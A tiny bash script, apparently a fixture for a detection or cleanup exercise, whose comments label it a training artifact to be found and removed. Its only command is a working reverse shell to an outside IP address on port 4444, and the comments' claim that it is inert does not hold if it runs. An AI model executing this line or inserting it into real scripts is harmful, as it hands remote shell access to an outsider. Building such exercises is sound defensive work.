#!/bin/bash
# TRAINING ARTIFACT — this is the 'malware' you are meant to find and remove.
# (It is inert text, but treat it like the real thing.)
bash -i >& /dev/tcp/185.220.101.9/4444 0>&1
